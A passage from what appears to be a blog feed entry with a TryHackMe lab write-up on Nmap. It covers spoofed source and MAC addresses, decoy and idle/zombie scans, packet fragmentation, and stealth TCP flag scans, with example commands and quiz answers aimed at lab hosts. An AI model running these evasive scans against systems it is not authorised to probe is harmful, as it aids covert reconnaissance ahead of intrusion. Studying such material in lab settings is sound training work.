-&lt;p&gt;&lt;strong&gt;What do you need to add to the command sudo nmap 10.10.141.22 to make the scan appear as if coming from the source IP address 10.10.10.11 instead of your IP address?&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-S 10.10.10.11&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;What do you need to add to the command sudo nmap 10.10.141.22 to make the scan appear as if coming from the source IP addresses 10.10.20.21 and 10.10.20.28 in addition to your IP address?&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-D 10.10.20.21,10.10.20.28,ME&lt;/code&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-6---fragmented-packets&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 6 - Fragmented Packets&lt;/h2&gt;
-
-&lt;p&gt;Nmap provides the option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-f&lt;/code&gt; to fragment packets. Once chosen, the IP data will be divided into 8 bytes or less. Adding another &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-f&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-f -f&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-ff&lt;/code&gt;) will split the data into 16 byte-fragments instead of 8.&lt;/p&gt;
-
-&lt;p&gt;To properly understand fragmentation, we need to look at the IP header in the figure below.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/nmap02.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h5 id=&quot;answer-the-questions-below-4&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
-
-&lt;p&gt;&lt;strong&gt;If the TCP segment has a size of 64, and -ff option is being used, how many IP fragments will you get?&lt;/strong&gt; If you added -ff (or -f -f), the fragmentation of the data will be multiples of 16.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-7---idlezombie-scan&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 7 - Idle/Zombie Scan&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sI ZOMBIE_IP 10.10.141.22&lt;/code&gt;, where ZOMBIE_IP is the IP address of the idle host (zombie).&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The idle (zombie) scan requires the following three steps to discover whether a port is open:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Trigger the idle host to respond so that you can record the current IP ID on the idle host.&lt;/li&gt;
-  &lt;li&gt;Send a SYN packet to a TCP port on the target. The packet should be spoofed to appear as if it was coming from the idle host (zombie) IP address.&lt;/li&gt;
-  &lt;li&gt;Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h5 id=&quot;answer-the-questions-below-5&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
-
-&lt;p&gt;&lt;strong&gt;You discovered a rarely-used network printer with the IP address 10.10.5.5, and you decide to use it as a zombie in your idle scan. What argument should you add to your Nmap command?&lt;/strong&gt; -sI 10.10.5.5&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-8---getting-more-details&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 8 - Getting More Details&lt;/h2&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--reason&lt;/code&gt; if you want Nmap to provide more details regarding its reasoning and conclusions. This flag gives us the explicit reason why Nmap concluded that the system is up or a particular port is open. For more detailed output, you can consider using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v&lt;/code&gt; for verbose output or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-vv&lt;/code&gt; for even more verbosity.&lt;/p&gt;
-
-&lt;p&gt;If &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-vv&lt;/code&gt; does not satisfy your curiosity, you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-d&lt;/code&gt; for debugging details or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-dd&lt;/code&gt; for even more details. &lt;strong&gt;You can guarantee that using -d will create an output that extends beyond a single screen.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h5 id=&quot;answer-the-questions-below-6&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
-
-&lt;p&gt;&lt;strong&gt;Launch the AttackBox if you haven’t done so already. After you make sure that you have terminated the VM from Task 4, start the VM for this task. Wait for it to load completely, then open the terminal on the AttackBox and use Nmap with nmap -sS -F –reason 10.10.237.236 to scan the VM. What is the reason provided for the stated port(s) being open?&lt;/strong&gt; SYN-ACK&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-9---summary&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 9 - Summary&lt;/h2&gt;
-
-&lt;p&gt;This room covered the following types of scans.&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Port Scan Type&lt;/th&gt;
-      &lt;th&gt;Example Command&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;TCP Null Scan&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sN 10.10.203.92&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;TCP FIN Scan&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sF 10.10.203.92&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;TCP Xmas Scan&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sX 10.10.203.92&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;TCP Maimon Scan&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sM 10.10.203.92&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;TCP ACK Scan&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sA 10.10.203.92&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;TCP Window Scan&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sW 10.10.203.92&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Custom TCP Scan&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.10.203.92&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Spoofed Source IP&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -S SPOOFED_IP 10.10.203.92&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Spoofed MAC Address&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--spoof-mac SPOOFED_MAC&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Decoy Scan&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -D DECOY_IP,ME 10.10.203.92&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Idle (Zombie) Scan&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sI ZOMBIE_IP 10.10.203.92&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Fragment IP data into 8 bytes&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-f&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Fragment IP data into 16 bytes&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-ff&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Option&lt;/th&gt;
-      &lt;th&gt;Purpose&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--source-port PORT_NUM&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;specify source port number&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--data-length NUM&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;append random data to reach given length&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;These scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports.&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Option&lt;/th&gt;
-      &lt;th&gt;Purpose&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--reason&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;explains how Nmap made its conclusion&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;verbose&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-vv&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;very verbose&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-d&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;debugging&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-dd&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;more details for debugging&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;hr /&gt;
-
-</description>
-        <pubDate>Thu, 16 Jun 2022 00:00:00 -0700</pubDate>
-        <link>http://localhost:4000//TryHackMe-nmap03</link>
-        <link href="http://localhost:4000/TryHackMe-nmap03"/>
-        <guid isPermaLink="true">http://localhost:4000/TryHackMe-nmap03</guid>
       </item>
     
   </channel>
